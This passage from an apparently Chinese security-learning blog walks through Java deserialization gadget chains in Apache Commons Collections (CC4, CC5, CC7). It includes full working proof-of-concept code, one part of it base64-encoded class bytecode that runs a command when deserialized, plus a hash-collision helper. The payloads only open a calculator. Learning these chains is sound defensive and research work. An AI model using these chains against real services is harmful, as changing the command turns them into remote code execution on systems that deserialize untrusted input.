class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMc2VyL2V2YWxDbGFzc1RlbXBsYXRlc0ltcGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACkBAApTb3VyY2VGaWxlAQAbZXZhbENsYXNzVGVtcGxhdGVzSW1wbC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEAGnNlci9ldmFsQ2xhc3NUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAQAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAJAA0AAAAMAAEAAAAFAA4ADwAAAAEAEAARAAIACwAAAD8AAAADAAAAAbEAAAACAAwAAAAGAAEAAAAVAA0AAAAgAAMAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAFAAVAAIAFgAAAAQAAQAXAAEAEAAYAAIACwAAAEkAAAAEAAAAAbEAAAACAAwAAAAGAAEAAAAaAA0AAAAqAAQAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAGQAaAAIAAAABABsAHAADABYAAAAEAAEAFwAIAB0ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAAwACQAPAAwADQANAA4AEQAQAA0AAAAMAAEADQAEAB4AHwAAACAAAAAHAAJMBwAhBAABACIAAAACACM=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templatesImpl &#125; ),<br>        &#125;;<br>        <span class="hljs-comment">//包装innerMap，回调TransformedMap.decorate</span><br>        <span class="hljs-comment">//防止payload生成过程中触发，先放进去一个空的Transform</span><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformerChain);<br>        <span class="hljs-comment">//第一个参数是初始化时的大小，至少需要2个元素才会触发排序和比较</span><br>        <span class="hljs-comment">//第二个参数是比较时的Comparator，传入前面实例化的comparator</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br>        setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br>        <span class="hljs-comment">//生成序列化数据</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        <span class="hljs-comment">//System.out.println(barr);</span><br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728230441860.png" alt="image-20240728230441860"></p><p>不过这条利用链在<code>commons-collections3</code>是无法中利用的。</p><p>因为<code>org.apache.commons.collections4.comparators.TransformingComparator</code>在<code>commons-collections4.0</code>之前没有实现<code>Serializable</code>接口，无法序列化。</p><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>这个链主要是为了解决高版本利用问题，使用<code>BadAttributeValueExpException</code>替换<code>AnnotationInvocationHandler</code>配合<code>TiedMapEntry#toString()</code>去串联<code>LazyMap#get()</code>调用<code>transform()</code>触发<code>ChainedTransformer</code>恶意对象反射链。</p><p>也就是我们前面CC1谈到的：</p><p>在8u71以后Java官方修改了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject</code>函数：<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p><p>改动后，不再直接使用反序列化得到的Map对象，而是新建了一个<code>LinkedHashMap</code>对象，并将原来的键值添加进去，传进去的恶意Map不再执行set或put操作，便无法触发<code>transform</code>。</p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><p>先给出Gadget Chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>    BadAttributeValueExpException#readObject()<br>    TiedMapEntry#toString()<br>    LazyMap#get()<br>                       <span class="hljs-comment">//恶意对象反射链部分</span><br>    ChainedTransformer.transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><p>借用学长的改改，同时把serialize和deserialize写进函数里，算是换一种代码风格：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ChainedTransformer chain=getChainedTransformer();<br>        Map lazymap=LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(),chain);<br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-number">1</span>);<br>        BadAttributeValueExpException e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(e,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br>        deserialize(serialize(e));<br>    &#125;<br>    <span class="hljs-keyword">static</span> ChainedTransformer <span class="hljs-title function_">getChainedTransformer</span><span class="hljs-params">()</span>&#123;<br>        ConstantTransformer ct=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        InvokerTransformer it1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        InvokerTransformer it2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        InvokerTransformer it_exec=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        );<br>        Transformer[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;ct,it1,it2,it_exec&#125;;<br>        ChainedTransformer chain=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(a);<br>        <span class="hljs-keyword">return</span> chain;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes)).readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728231404160.png" alt="image-20240728231404160"></p><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>CC7压轴。</p><p>因为它真的很绕。打的还是<code>CommonsCollections 3.1 - 3.2.1</code></p><p>换了<code>Hashtable</code>类，利用其<code>reconstitutionPut</code>方法中比较key的值，会调用LazyMap的equals方法。</p><h3 id="为什么要put两个lazymap"><a href="#为什么要put两个lazymap" class="headerlink" title="为什么要put两个lazymap"></a>为什么要put两个lazymap</h3><p>因为为了进<code>reconstitutionPut</code> <code>for</code>循环，<code>tab</code>需要不为空。</p><p><code>tab</code>其实就是<code>hashtable</code>，<code>entry</code>是单链，动调能发现<code>put</code>两个的时候能让<code>tab</code>不为空</p><img src="/2024/07/28/Commons-Collections/image-20240728232740736.png" class="" title="image-20240728232740736"><h3 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a>哈希碰撞</h3><p><code>if</code>这一行由于用 <code>&amp;&amp;</code> 连接，左边为<code>false</code>就不会执行右边。</p><p>这两个<code>hash</code>对应当前<code>key</code>和上一个<code>key</code>的<code>hashcode</code>：</p><img src="/2024/07/28/Commons-Collections/image-20240728233018118.png" class="" title="image-20240728233018118"><p>这里key我们选择的是String，观察<code>String.hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><p>爆破两位就可:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashCollision</span> &#123;<br>    <span class="hljs-keyword">static</span> String dict=<span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> len=dict.length();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a1=<span class="hljs-number">0</span>;a1&lt;len;a1++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a2=<span class="hljs-number">0</span>;a2&lt;len;a2++)&#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b1=<span class="hljs-number">0</span>;b1&lt;len;b1++)&#123;<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b2=<span class="hljs-number">0</span>;b2&lt;len;b2++)&#123;<br>                        <span class="hljs-keyword">if</span>(a1!=b1&amp;&amp;a2!=b2)&#123;<br>                            String s1=get(a1)+get(a2);<br>                            String s2=get(b1)+get(b2);<br>                            <span class="hljs-keyword">if</span>(s1.hashCode()==s2.hashCode())&#123;<br>                                System.out.println(s1+<span class="hljs-string">&quot;\n&quot;</span>+s2);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;fuck&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>        <span class="hljs-keyword">return</span>  String.valueOf(dict.charAt(i));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="为什么map2-remove-00"><a href="#为什么map2-remove-00" class="headerlink" title="为什么map2.remove(&quot;00&quot;);"></a>为什么<code>map2.remove(&quot;00&quot;);</code></h3><p>其实和上面的CommonsCollections6一样道理，<code>hashtable.put(map2, 1);</code>这一行也会调用<code>lazymap.get</code>，从而多加了一个带着<code>processImpl</code>的元素，不能序列化。</p><p><img src="/2024/07/28/Commons-Collections/image-20240728233236250.png" alt="image-20240728233236250"></p><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><p>先给出Gadget Chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Hashtable#readObject()<br>    Hashtable#reconstitutionPut()<br>AbstractMapDecorator#equals()<br>    AbstractMap#equals()<br>    LazyMap#get()<br>                                <span class="hljs-comment">//恶意对象反射链部分</span><br>    ChainedTransformer#transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> getChainedTransformer();<br><br>            Map&lt;String, Integer&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title 